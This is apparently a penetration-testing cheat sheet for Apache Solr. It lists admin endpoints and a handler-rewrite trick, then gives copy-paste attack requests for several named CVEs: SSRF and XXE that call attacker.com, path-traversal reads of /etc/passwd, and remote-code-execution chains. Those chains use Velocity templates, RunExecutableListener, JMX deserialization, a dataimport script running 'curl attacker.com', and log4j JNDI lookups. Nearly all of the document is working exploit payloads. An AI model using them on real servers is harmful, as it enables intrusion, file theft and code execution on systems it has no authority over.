# Interesting URLs

Admin interface:

```
/solr/admin
```

List cores:

```
/solr/admin/cores
```

Get metrics:

```
/solr/admin/metrics
```

Query all data in a core:

```
/solr/<core>/select?q=*
```

Get replication info for a core:

```
/solr/<core>/replication?command=indexversion
/solr/<core>/replication?command=details
```

Get supported resources for a core:

```
/solr/<core>/admin/mbeans
```
# Tricks

When using the method `select` to query a core, the parameters `qt` can be used to rewrite the request handler form `select` to any other. For example, `/solr/<core>/select?qt=/config` will be rewritten in the backend to `/solr/<core>/config`.

Sometimes, the rewrite affects everything that the parameter `qt` includes. For example, a request like `/solr/<core>/select?qt=/config?param=1337` would be rewritten to `/solr/<core>/config?param=1337`.

# Known vulnerabilities

These vulnerabilities can be combines with the previous tricks to bypass restrictions.

## SSRF

SSRFs can be used to access the internal admin console at `127.0.0.1:8983`.

### \[CVE-2021-27905\] Replication blind SSRF

```
/solr/<core>/replication/?command=fetchindex&masterUrl=http://attacker.com
```

### Shards

```
/solr/<core>/select?shards=http://attacker.com%23
/solr/<core>/select?shards=http://attacker.com%23&stream.body=<body>
/solr/<core>/select?shards=http://attacker.com&shards.qt=/test
```

### Debug dump SSRF

```
/solr/<core>/debug/dump?param=ContentStreams&stream.url=http://attacker.com
```

## Arbitrary File Read

### Debug dump Arbitrary File Read

```
/solr/<core>/debug/dump?param=ContentStreams&stream.url=file:///etc/passwd
```
### \[CVE-2017-3163\] Replication Arbitrary File Read

```
/solr/<core>/replication?command=filecontent&file=../../../../../../../../../../../../../etc/passwd&wt=filestream`
```

## XXE
### Query XXE

```
/solr/<core>/select?fq={!xmlparser v='<!DOCTYPE a SYSTEM "https://attacker.com"><a></a>'}
/solr/<core>/select?fq={!xmlparser v='<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'}
```

### \[CVE-2017-12629\] XXE

```
/solr/<core>/select?q=<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "https://attacker.com/">%remote;]><root/>&wt=xml&defType=xmlparser
```

## RCE
### RCE via debug dump 

1. 
```
POST /solr/<core>/config HTTP/1.1
Host: domain.com
Content-Type: application/json

{
  "set-property" : {
    "requestDispatcher.requestParsers.enableRemoteStreaming":true
  }
}
```
2. 
```
/solr/<core>/debug/dump?param=ContentStreams&&stream.url=jar:http://attacker.com/test.jar?!/Test.class
```

### \[CVE-2017-12629\] RCE via RunExecutableListener 

1. 
```
POST /solr/<core>/config HTTP/1.1
Host: domain.com
Content-Type: application/json
Content-Length: 213

{
  "add-listener" : {
    "event":"postCommit",
    "name":"newlistener",
    "class":"solr.RunExecutableListener",
    "exe":"nslookup",
    "dir":"/usr/bin/",
    "args":["attacker.com"]
  }
}
```
2. 
```
`/solr/core/update?commit=true`
```

### \[CVE-2019-0192\] RCE via deserialization

Further exploitation requires supplying a deserialization payload, but this is enough to find it:

```
POST /solr/<core>/config HTTP/1.1
Host: domain.com
Content-Type: application/json
Content-Length: 106

{
  "set-property": { 
    "jmx.serviceUrl": "service:jmx:rmi:///jndi/rmi://attacker.com/jmxrmi"
  }
}
```

### \[CVE-2019-17558\] RCE via Velocity template

1. 
```
POST /solr/<core>/config HTTP/1.1
Host: domain.com
Content-Type: application/json
Content-Length: 259

{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}
```
2. 
```
`/solr/<core>/select?q=1&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end`
```

### RCE via dataimport

```
POST /solr/<core>/dataimport HTTP/1.1
Host: domain.com
Content-type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest

command=full-import&commit=true&core=<core>&name=dataimport&dataConfig=%3CdataConfig%3E%0A++%3CdataSource+type%3D%22URLDataSource%22%2F%3E%0A++%3Cscript%3E%3C!%5BCDATA%5B%0A++++++++++function+poc()%7B+java.lang.Runtime.getRuntime().exec(%22curl%20attacker.com%22)%3B%0A++++++++++%7D%0A++%5D%5D%3E%3C%2Fscript%3E%0A++%3Cdocument%3E%0A++++%3Centity+name%3D%22stackoverflow%22%0A++++++++++++url%3D%22https%3A%2F%2Fstackoverflow.com%2Ffeeds%2Ftag%2Fsolr%22%0A++++++++++++processor%3D%22XPathEntityProcessor%22%0A++++++++++++forEach%3D%22%2Ffeed%22%0A++++++++++++transformer%3D%22script%3Apoc%22+%2F%3E%0A++%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E
```

### log4j

```
/solr/admin/cores?action=%24%7Bjndi%3Aldap%3A%2F%2F%24%7B%3A-1337%7D%24%7B%3A-1337%7D.%24%7BhostName%7D.uri.attacker.com%2F%7D

/solr/admin/collections?action=%24%7Bjndi%3Aldap%3A%2F%2F%24%7B%3A-1337%7D%24%7B%3A-1337%7D.%24%7BhostName%7D.uri.attacker.com%2F%7D
```

# References

https://github.com/veracode-research/solr-injection/
https://github.com/search?q=repo%3Aprojectdiscovery%2Fnuclei-templates%20solr&type=code